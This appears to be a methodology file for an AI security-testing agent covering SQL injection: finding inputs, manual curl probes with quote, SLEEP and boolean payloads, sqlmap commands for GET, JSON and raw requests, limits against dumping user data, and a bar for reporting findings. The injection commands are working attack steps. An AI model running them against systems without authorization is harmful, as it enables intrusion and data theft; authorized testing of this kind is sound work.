---
name: sql_injection
description: SQL injection testing methodology — manual probes first, sqlmap only to confirm
---

# SQL Injection (CWE-89)

## 1. Find candidate inputs

Prioritize: search boxes, login forms, sort/filter params, REST API params,
cookies used in queries. From your endpoint map, list every param echoed into
a response or affecting result sets.

## 2. Manual probes (cheap, low false-positive)

For each candidate, send a baseline and a probe; COMPARE responses:

```bash
curl -s "<target>/search?q=pet" > /tmp/base
curl -s "<target>/search?q=pet'" > /tmp/probe1
curl -s "<target>/search?q=pet''" > /tmp/probe2
diff /tmp/base /tmp/probe1; echo "---"; diff /tmp/probe1 /tmp/probe2
```

Signals: 500 errors, SQL error text (SQLite/MySQL/Postgres), response that
changes between `'` and `''` (classic quote-escaping tell), timing with
`pet' AND SLEEP(3)-- -` (compare total time via `time curl`).

Boolean-based confirmation (the strongest manual evidence):

```bash
curl -s "<target>/search?q=pet' AND 1=1-- -" | wc -c
curl -s "<target>/search?q=pet' AND 1=2-- -" | wc -c
```

Different lengths for 1=1 vs 1=2 = proven boolean injection.

## 3. sqlmap — confirm & enumerate minimally (ALWAYS --batch, non-interactive)

```bash
# String param:
sqlmap -u "<target>/search?q=pet" -p q --batch --level 3 --risk 2 --technique=BEUT

# POST/JSON (capture body from curl or the browser):
sqlmap -u "<target>/login" --data='{"email":"a@b.c","password":"x"}' \
  --headers='Content-Type: application/json' -p email --batch

# From a raw request file (copy exact request into /tmp/req.txt):
sqlmap -r /tmp/req.txt --batch
```

Limits: `--threads 5`, no `--dump` of real user tables. Prove readable data
with `--count` or a single-row `--sql-query`, e.g.
`--sql-query="SELECT version()"`.

## 4. Validation bar for report_finding

- Evidence: the diff/time output or sqlmap's "is vulnerable" banner + backend
  version query result.
- PoC: the exact curl or sqlmap command a human can re-run.
- Blind assertion ("probably injectable") is NOT a finding — downgrade to
  confidence low or drop it.
